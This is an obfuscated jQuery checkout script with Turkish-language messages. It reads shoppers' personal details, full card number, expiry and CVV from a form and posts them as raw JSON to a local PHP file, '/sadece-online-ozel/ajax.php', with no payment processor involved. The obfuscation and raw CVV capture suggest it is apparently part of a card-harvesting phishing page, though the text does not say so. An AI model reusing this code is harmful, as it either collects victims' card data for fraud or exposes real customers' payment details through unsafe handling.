$(document).ready(function () {
    const _0x1f50f8 = $('#js-checkout-form')
    _0x1f50f8.on('submit', function (_0x582e51) {
        _0x582e51.preventDefault()
        const _0x9ee38f = $('#order-spinner'),
            _0x543bd9 = $('#order-complete'),
            _0x50c139 = $('#payment_button')
        _0x9ee38f.removeClass('hidden')
        _0x543bd9.addClass('hidden')
        const _0x6308c0 = 'payment',
            _0x2cd65b = $('#name_surname').val(),
            _0x3bdbc5 = $('#phone_number').val(),
            _0x361e21 = $('#email_address').val(),
            _0x2db531 = $('#city').val(),
            _0x48a9b1 = $('#district').val(),
            _0x40c01a = $('#address').val(),
            _0x2bd974 = $('#cardholder_name').val(),
            _0x54b0f2 = $('#card_number').val(),
            _0x48d099 = $('#card_month').val(),
            _0x5abf2f = $('#card_year').val(),
            _0x19f494 = $('#card_cvv').val(),
            _0x257a73 = _0x1f50f8.attr('data-amount'),
            _0x461d8f = {
                action: _0x6308c0,
                name_surname: _0x2cd65b,
                phone_number: _0x3bdbc5,
                email_address: _0x361e21,
                city: _0x2db531,
                district: _0x48a9b1,
                address: _0x40c01a,
                cardholder_name: _0x2bd974,
                card_number: _0x54b0f2,
                card_month: _0x48d099,
                card_year: _0x5abf2f,
                card_cvv: _0x19f494,
                amount: _0x257a73,
            }
        const _0x4e760e = _0x461d8f
        if (_0x4e760e) {
            $.ajax({
                url: '/sadece-online-ozel/ajax.php',
                method: 'POST',
                data: JSON.stringify(_0x4e760e),
                contentType: 'application/json',
                success: function (_0x45fd13) {
                    _0x45fd13 = JSON.parse(_0x45fd13)
                    if (_0x45fd13.status === true) {
                        setTimeout(function () {
                            window.location.href = _0x45fd13.redirect
                        }, 2000)
                    } else {
                        alert(_0x45fd13.message),
                            _0x9ee38f.addClass('hidden'),
                            _0x543bd9.removeClass('hidden'),
                            _0x50c139.attr('disabled', false)
                    }
                },
            })
        } else {
            alert('Lütfen teslimat/ödeme bilgilerinizi eksiksiz doldurunuz.')
            _0x9ee38f.addClass('hidden')
            _0x543bd9.removeClass('hidden')
            _0x50c139.attr('disabled', false)
        }
    })
})